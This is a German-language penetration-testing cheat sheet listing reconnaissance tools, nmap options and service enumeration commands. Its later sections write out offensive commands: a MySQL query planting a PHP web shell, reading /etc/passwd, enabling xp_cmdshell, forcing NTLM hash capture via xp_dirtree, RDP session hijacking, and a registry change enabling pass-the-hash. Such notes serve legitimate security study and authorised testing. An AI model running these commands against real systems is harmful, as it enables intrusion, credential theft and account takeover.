# Information Gathering
## External Recon

### DNS / IP / Zertifikate
- [ICANN](https://lookup.icann.org/en)
- [WhoIS Lookup](https://whois.domaintools.com/)
- [ViewDNS](https://viewdns.info/)
- [IANA](https://www.iana.org/) fuer NA
- [RIPE](https://www.ripe.net/) fuer EU
- [BGP Toolkit](https://bgp.he.net/)
- [NsLookup](https://www.nslookup.io/)
- [Crt.sh](https://crt.sh/)
- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [censys](https://search.censys.io/)
- [Netcraft](https://sitereport.netcraft.com/)
- [The Harvester](https://github.com/laramies/theHarvester)
- [ZoneTransfers](https://hackertarget.com/zone-transfer/)
- [Gobuster](https://github.com/OJ/gobuster) with DNS Module
- [DNSX](https://github.com/projectdiscovery/dnsx)
- [DnsDumpster](https://dnsdumpster.com/)

### Infrastruktur
- [Whatweb](https://www.morningstarsecurity.com/research/whatweb) erkennt JS Libraries, Web-Server usw
- [Wappalyzer](https://www.wappalyzer.com/) erkennt JS Libraries, Web-Server usw
- [WafWOOf](https://github.com/EnableSecurity/wafw00f) Anwendungs Firewall Fingerprinting

### Social Media
- Social Media von Mitarbeitern ueberpruefen
- Google Suche [Cheatsheet](https://www.exploit-db.com/google-hacking-database)
- Stellenangebote wie LinkedIn, Indeed.com, Glassdoor

### Breach Data Sources
- [HaveBeenPwned](https://haveibeenpwned.com/)
- [Dehashed](https://www.dehashed.com/)

## Enumeration

### Web Enumeration
- [ffuf](https://github.com/ffuf/ffuf)
- [ffuf Guide](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html)

### Host Discovery
- [nmap](https://linux.die.net/man/1/nmap) \[Netzwerk_Adresse/Praefix\] \[Optionen\]

### Host/Port Scanning
- [nmap](https://linux.die.net/man/1/nmap) \[IP_Adresse\] \[Optionen\]
- Status von Ports:
```
	- open: Verbindungen hergestellt
	- closed: Verbindungen nicht hergestellt. TCP RST Flag kommt zurueck
	- filtered: Wir bekommen einen Error Code oder keine Rueckmeldung
	- unfiltered: Ein TCP-ACK kommt zurueck. Kann open|closed sein
	- open|filtered: Wir bekommen keine Antwort von dem Port
	- closed|filtered: Kommt nur bei IP ID idle Scans vor ist nicht moeglich zu unterscheiden zwischen closed|filtered
```

### Scan Optionen
```
	- -sn | Deaktiviert Port Scanning
	- -iL | Fuehrt definierte Scans gegen die angegebene Liste durch
	- -PE | Fuehrt einen Ping Scan mit einer ICMP Echo Anfrage aus
	- --packet-trace | Zeigt alle gesendeten und empfangenen Pakete
	- --reason | Zeigt den Grund fuer die Ausgabe
	- --disabled-arp-ping | Wir koennen fuehrt den SCAN mit 

	- -sS | Scannt die Top 1000 TCP Ports mit einem SYN Paket 
	- -sT | TCP Scan baut eine Verbindung auf
	- -sA | TCP ACK Scan ist schwieriger von einer Firewall zu filtern
	- -sU | Fuehrt einen UDP Scan aus
	- -sV | Gibt weitere Informationen fuer den Port aus
	- -Pn | Deaktiviert ICMP Echo Anfragen
	- -n | Deaktiviert die DNS-Aufl√∂sung
	- -o | Liest das Betriebssytem aus

	- -p | Spezifiziert Ports einzelnd (-p 21,22,23) nach Bereichen(-p 22-333)
	- -p- | Scannt alle Ports
	- --top-ports= | Scannt die Top X Ports
	- -F | Scannt die Top 100 Ports

	- -T | Gibt an wie schnelle der Scan laeuft 5 ist aggressiv 0 ist friedlich
	- --min-parallelism | Anzahl der parallelen Sonden
	- --max-rtt-timeout | Maximale Zeit nachdem Timeoutzeit ein Paket haben sollte 
	- --min-rate | Mindest Anzahl an Paketen die gleichzeitig gesendet werden
	- --max-retries | Maximale Anzahl von Wiederholungen
```

### Ausgabe
```
	- -oN | Erstelle einen Ausgabe mit .nmap Dateiendung
	- -oG | Erstellt Grepable Ausgabe mit .gnmap Dateiendung 
	- -oX | Erstellt einen XML Ausgabe mit .xml Dateiendung
	- xsltproc | Erstellt aus einem XML Ausgabe eine HTML Seite
	- -oA | Speichert Ausgabe in allen Formaten
```

### Scripting Engine
- --script | Ein internes Nmap Script kann ausgefuehrt werden
- [Script Kategorien](https://nmap.org/nsedoc/scripts/)
- [Script Listen](https://nmap.org/book/nse-usage.html)

### SMB
- [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux)
- [Responder](https://github.com/lgandx/Responder)
- [RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
- [impacket-ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
```
	- Auflisten Shares mit null Session: smbclient -N -L //[IP]
	- Mit Share verbinden: smbclient //[IP]/[Sharename]
	- smbmap -H [IP] -r [Foldername]
```

### NFS
```
	- Show Mounts: showmount -e <IP>
	- sudo mount -t nfs [IP]:/ ./[Local_Dir]/ -o nolock
```

### DNS
```
	- Gibt andere Server aus: dig ns [Domain] @[DNS_Server_IP]
	- Gibt alle Eintrage im DNS Server aus: dig any [Domaine] @[DNS_Server_IP]
	- Gibt eine Zone des DNS Servers aus: dig axfr [Zone.Domaine] @[DNS_Server_IP]
```

#### Sudbdomaine Bruteforcing
- [DnsEnum](https://github.com/fwaeytens/dnsenum)
- [Firece](https://github.com/mschwager/fierce)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [Subbrute](https://github.com/TheRook/subbrute)
```
	- dnsenum --dnsserver [DNS_IP] --enum -p 0 -s 0 -o [Output.txt] -f [WordList] [Domaine]
	- fierce --domain [Domain]
	- ./subfinder -d [Domain] -v 
```

#### DNS Spoofing
- Bei einem DNS Cache Spoofing wird ein DNS Eintrag manipuliert:
- [Ettercap](https://www.ettercap-project.org/)
- [Bettercap](https://www.bettercap.org/)

### Email
```
	- host -t MX [Domain]
	- dig mx [Domain]
	- host -t A [Maildomain]
```

#### SMTP
- [SMTP Befehle](https://mailtrap.io/blog/smtp-commands-and-responses/)
- [SMT-User-Enum](https://github.com/pentestmonkey/smtp-user-enum)
```
	- telnet <IP> 25
```

#### IMAP
- [IMAP Befehle](https://www.atmail.com/blog/imap-commands/)
```
	- openssl s_client -connect <IP>:imaps
```

#### POP3
- [POP3 Befehle](https://faq.netzprisma.de/so-funktioniert-pop3/)
```
	- openssl s_client -connect <IP>:pop3s
```

#### Cloud
- [O365Spray](https://github.com/0xZDH/o365spray)

### SNMP
- [Snmpwalk](https://linux.die.net/man/1/snmpwalk)
- [OneSixtyOne](https://github.com/trailofbits/onesixtyone)
```
	- snmpwalk -v2c -c public [IP]
	- onesixtyone -c [SNMP_Wordlist] [IP]
```

### Oracle TNS
- [Odat](git clone https://github.com/quentinhardy/odat.git)
```
	- ./odat.py all -s [IP]
	- Connect to Oracle Database: sqlplus [User]/[Password[@[IP]/XE;
```
### FTP
#### FTP Bounce Attack
```
	- FTP Server kann Traffic an einen anderes Geraet weitersenden
	- Beispiel: nmap -Pn -v -n -b [User]:[Password]@[FTP_Server_IP[ [IP_zu_Scannen]
```

### SQL
#### Connect
```
	- mysql -u [User] -p[Password] -h [IP]
	- sqsh -S [IP] -U [User] -P '[Password]' -h
	- sqsh -S [IP] -U .\\[User] -P '[Password]' -h
	- sqlcmd -S SRVMSSQL -U [User] -P '[Password]' -y 30 -Y 30
	- mssqlclient.py -p [Port] [User]@[IP]
```

#### Syntax
##### MySQL
```
	- Show Database:
		- SHOW DATABASES;
	- Select a Database:
		- USE [Database];
	- Show Tables:
		- SHOW TABLES;
```

##### MsSQL
```
	- Show Database:
		- SELECT name FROM master.dbo.sysdatabases
	- Select a Database:
		- USE [Database]
	- Show Tables:
		- SELECT table_name FROM [Database].INFORMATION_SCHEMA.TABLES
```
#### Execute Commands
##### MsSQL
- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
- Wenn xp_cmdshell nicht aktiviert ist
```
	- EXECUTE sp_configure 'show advanced options', 1
	- RECONFIGURE
	- EXECUTE sp_configure 'xp_cmdshell', 1
	- RECONFIGURE
```

###### Read Local Files
```
	- SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

- Wenn das nicht funktioniert
```
	- sp_configure 'show advanced options', 1
	- RECONFIGURE
	- sp_configure 'Ole Automation Procedures', 1
	- RECONFIGURE
```

###### Capture Hash
  - [Responder](https://github.com/lgandx/Responder) starten oder
  - [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) starten
```
	- EXEC master..xp_dirtree '\\[IP]\share\'
	- EXEC master..xp_subdirs '\\[IP]\share\'
```

  - Identifizieren Sie Benutzer, fuer die wir uns ausgeben koennen
```
	- SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

###### Rolle und User verifizieren
```
	- SELECT System_User
	- SELECT IS_SRVROLEMEMBER('sysadmin')
```

- Sich als ein User ausgeben
```
	- EXECUTE AS LOGIN = '[User]' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

###### Mit anderer Datenbank kommunizieren
  - Linked Server ausgeben
```
	- SELECT srvname, isremote FROM sysservers
```

   - Mit Execute koennen wir Statements auf einem anderen Server ausfuehren
```
	- EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<Srvname>]
```

##### MySQL
```
	- Write Local Files:
		- SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '[WebShell_OutputFile]';
		- Die Variable securet_file_priv verwaltet Rechte fuer Daten Import/Export
	- Read Local Files:
		- select LOAD_FILE("/etc/passwd");
```
	
### RDP
- [xfreerdp](https://linux.die.net/man/1/xfreerdp)
#### RDP Session Hijacking
```
	- Eingloggte User anzeigen:
		- query user
	- Um sich als einen User anderen User auszugeben:
		- sc.exe create sessionhijack binpath= "cmd.exe /k tscon <Target_SessionID> /dest:<Our_SessionID>"
		- net start sessionhijack
```
#### RDP Pass-the-Hash
```
	- Wenn Pass-the-Hash nicht zugelassen wird koennen wird dies aktivieren
		-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	- xfreerdp /v:<IP> /u:<User> /pth:<Hash>
```




